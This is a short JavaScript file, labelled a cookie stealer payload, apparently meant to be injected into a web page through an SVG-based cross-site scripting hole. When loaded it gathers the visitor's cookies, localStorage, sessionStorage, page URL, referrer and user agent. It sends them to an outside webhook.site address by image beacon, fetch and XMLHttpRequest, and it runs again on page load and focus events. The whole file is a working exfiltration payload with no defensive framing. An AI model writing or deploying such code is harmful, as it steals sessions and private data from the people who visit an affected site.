// Cookie stealer payload
function stealCookies() {
  var cookies = document.cookie;
  var currentUrl = window.location.href;
  var userAgent = navigator.userAgent;

  // Prepare data to exfiltrate
  var data = {
    cookies: cookies,
    url: currentUrl,
    domain: document.domain,
    referrer: document.referrer,
    userAgent: userAgent,
    timestamp: new Date().toISOString(),
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  };

  // Method 1: Image-based exfiltration
  var img = new Image();
  img.src = 'https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e?source=svg&data=' + encodeURIComponent(JSON.stringify(data));

  // Method 2: Fetch API (if available)
  if (window.fetch) {
    fetch('https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    }).catch(function(e) {
      console.log('Fetch failed:', e);
    });
  }

  // Method 3: XMLHttpRequest fallback
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
  } catch(e) {
    console.log('XHR failed:', e);
  }
}

// Execute immediately
stealCookies();

// Also execute when DOM is fully loaded
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', stealCookies);
}

// Hook into common events to catch more data
window.addEventListener('load', stealCookies);
window.addEventListener('focus', stealCookies);
